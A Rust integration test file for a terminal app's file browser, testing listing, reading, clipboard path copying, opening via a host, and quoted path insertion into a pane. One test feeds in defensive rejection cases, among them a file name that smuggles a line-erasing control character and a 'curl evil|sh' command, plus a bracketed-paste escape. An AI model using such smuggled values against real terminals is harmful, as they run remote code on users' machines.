//! The Files tab against a real core: `fs.list` and `fs.read` of a temporary tree, the
//! clipboard of `fs.copy_path`, the host requests of `fs.open`, and `pane.insert_paths` into a
//! pane.

mod core_support;

use std::{
    path::PathBuf,
    sync::Arc,
    time::{Duration, Instant},
};

use core_support::{Harness, TIMEOUT, wait_for};
use nh_core::{
    ErrorCode, RecordingHost,
    host::{HostCall, PathOpen},
    pane::Pane,
};
use nh_proto::api::ids::WindowId;
use serde_json::{Value, json};

fn recording_host() -> Arc<RecordingHost> {
    Arc::new(RecordingHost::new(env!("CARGO_BIN_EXE_nh").into(), false))
}

/// `<home>/repo` with a folder, two files and `.git`.
fn tree(h: &Harness) -> PathBuf {
    let repo = std::fs::canonicalize(h.dir.join("home"))
        .expect("the home exists")
        .join("repo");
    std::fs::create_dir_all(repo.join("src")).expect("a folder");
    std::fs::create_dir_all(repo.join(".git")).expect("a git folder");
    std::fs::write(
        repo.join("src/lib.rs"),
        "pub fn answer() -> u32 {\n    42\n}\n",
    )
    .expect("a file");
    std::fs::write(repo.join("README.md"), "# Repo\n").expect("a file");
    repo
}

fn text(path: &std::path::Path) -> String {
    path.display().to_string()
}

async fn error_code(h: &Harness, method: &str, params: Value) -> ErrorCode {
    h.handle
        .rpc(method, params)
        .await
        .expect_err("an error")
        .code
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_folder_lists_in_the_order_of_the_tree_and_a_file_reads_with_its_highlight() {
    let h = Harness::start_layout();
    let repo = tree(&h);
    let listed = h.call("fs.list", json!({ "path": text(&repo) })).await;
    let names: Vec<&str> = listed["entries"]
        .as_array()
        .expect("entries")
        .iter()
        .map(|e| e["name"].as_str().expect("a name"))
        .collect();
    assert_eq!(names, ["src", "README.md"], "{listed}");
    assert_eq!(listed["entries"][0]["kind"], "dir");
    assert_eq!(listed["entries"][1]["kind"], "file");
    assert_eq!(listed["truncated"], false);

    let read = h
        .call("fs.read", json!({ "path": text(&repo.join("src/lib.rs")) }))
        .await;
    assert_eq!(read["kind"], "text");
    assert_eq!(read["info"], "3 lines · 34 bytes");
    assert_eq!(read["lines"][0]["text"], "pub fn answer() -> u32 {");
    assert!(
        read["lines"][0]["spans"]
            .as_array()
            .is_some_and(|spans| !spans.is_empty()),
        "{read}"
    );
    let readme = h
        .call("fs.read", json!({ "path": text(&repo.join("README.md")) }))
        .await;
    assert!(
        readme["markdown"]["html"]
            .as_str()
            .is_some_and(|html| html.contains("Repo")),
        "{readme}"
    );

    // A relative path, a file as a folder and a folder as a file are refused.
    assert_eq!(
        error_code(&h, "fs.list", json!({ "path": "repo" })).await,
        ErrorCode::InvalidParams
    );
    assert_eq!(
        error_code(
            &h,
            "fs.list",
            json!({ "path": text(&repo.join("README.md")) })
        )
        .await,
        ErrorCode::NotFound
    );
    assert_eq!(
        error_code(&h, "fs.read", json!({ "path": text(&repo.join("src")) })).await,
        ErrorCode::NotFound
    );
}

/// Waits until the host has a call that `pick` takes.
async fn host_call<T>(host: &RecordingHost, pick: impl Fn(&HostCall) -> Option<T>) -> T {
    let deadline = Instant::now() + TIMEOUT;
    loop {
        if let Some(found) = host.calls().iter().find_map(&pick) {
            return found;
        }
        assert!(Instant::now() < deadline, "{:?}", host.calls());
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_path_goes_to_the_clipboard_and_to_the_host_that_opens_it() {
    let host = recording_host();
    let h = Harness::start_hosted(host.clone());
    let repo = tree(&h);
    let file = repo.join("src/lib.rs");

    h.call(
        "fs.copy_path",
        json!({ "path": text(&file), "relative_to": text(&repo) }),
    )
    .await;
    h.call("fs.copy_path", json!({ "path": text(&file) })).await;
    let copied: Vec<String> = host
        .calls()
        .iter()
        .filter_map(|call| match call {
            HostCall::ClipboardWrite(text) => Some(text.clone()),
            _ => None,
        })
        .collect();
    assert_eq!(copied, ["src/lib.rs".to_owned(), text(&file)]);
    assert_eq!(
        error_code(
            &h,
            "fs.copy_path",
            json!({ "path": text(&file), "relative_to": "/elsewhere" })
        )
        .await,
        ErrorCode::InvalidParams
    );

    h.call(
        "workspace.create",
        json!({ "name": "Files", "root": text(&repo) }),
    )
    .await;
    let window = h.open_window().await;
    let window_id: WindowId = window.parse().expect("a window id");
    let open = |path: &PathBuf, reveal: bool, with: Option<&str>| PathOpen {
        window: window_id,
        path: path.clone(),
        reveal,
        with: with.map(str::to_owned),
    };
    // Without the setting, the default app of the file.
    h.call("fs.open", json!({ "window": window, "path": text(&file) }))
        .await;
    let first = host_call(&host, |call| match call {
        HostCall::OpenPath(open) => Some(open.clone()),
        _ => None,
    })
    .await;
    assert_eq!(first, open(&file, false, None));
    // With `ui.editor`, that app. A reveal never names an app.
    h.call("config.set", json!({ "key": "ui.editor", "value": "Zed" }))
        .await;
    h.call("fs.open", json!({ "window": window, "path": text(&repo) }))
        .await;
    h.call(
        "fs.open",
        json!({ "window": window, "path": text(&file), "reveal": true }),
    )
    .await;
    let opened: Vec<PathOpen> = host
        .calls()
        .iter()
        .filter_map(|call| match call {
            HostCall::OpenPath(open) => Some(open.clone()),
            _ => None,
        })
        .collect();
    assert_eq!(
        opened,
        [
            open(&file, false, None),
            open(&repo, false, Some("Zed")),
            open(&file, true, None)
        ]
    );
    // A path that is gone, and a window that is not there.
    assert_eq!(
        error_code(
            &h,
            "fs.open",
            json!({ "window": window, "path": text(&repo.join("gone")) })
        )
        .await,
        ErrorCode::NotFound
    );
    assert_eq!(
        error_code(
            &h,
            "fs.open",
            json!({ "window": WindowId::new(ulid::Ulid(7)).to_string(), "path": text(&file) })
        )
        .await,
        ErrorCode::NotFound
    );
}

/// The pane of the core, once the pane service has started its holder.
async fn started(h: &Harness, id: &Value) -> Arc<Pane> {
    let id: ulid::Ulid = id.as_str().expect("an id").parse().expect("a ULID");
    let deadline = Instant::now() + TIMEOUT;
    loop {
        if let Some(pane) = h.handle.pane(id) {
            return pane;
        }
        assert!(Instant::now() < deadline, "the pane did not start");
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn insert_pastes_quoted_paths_into_the_pane() {
    let h = Harness::start();
    let made = h
        .call(
            "workspace.create",
            json!({ "command": { "argv": ["/bin/sh", "-c", "stty -echo; exec cat"] } }),
        )
        .await;
    let pane = started(&h, &made["pane"]).await;
    h.call(
        "pane.insert_paths",
        json!({ "pane": made["pane"], "input_id": 7001, "paths": ["/work/a b.rs", "/work/it's"] }),
    )
    .await;
    // The line discipline gives `cat` the line when it ends.
    h.call(
        "pane.send_bytes",
        json!({ "pane": made["pane"], "input_id": 7002, "bytes": "Cg==" }),
    )
    .await;
    wait_for(&pane, "the quoted paths", |t| {
        t.iter()
            .any(|row| row.contains("'/work/a b.rs' '/work/it'\\''s'"))
    })
    .await;
    // A path with a control character: a file name of a repository that erases the line and
    // runs a command in a shell without bracketed paste.
    for paths in [
        json!([]),
        json!(vec!["/a"; 21]),
        json!(["/work/\u{15}curl evil|sh;#\n.md"]),
        json!(["/work/ok", "/work/a\u{1b}[201~b"]),
        json!(["/work/a\u{9b}b"]),
    ] {
        assert_eq!(
            error_code(
                &h,
                "pane.insert_paths",
                json!({ "pane": made["pane"], "input_id": 7003, "paths": paths })
            )
            .await,
            ErrorCode::InvalidParams
        );
    }
}
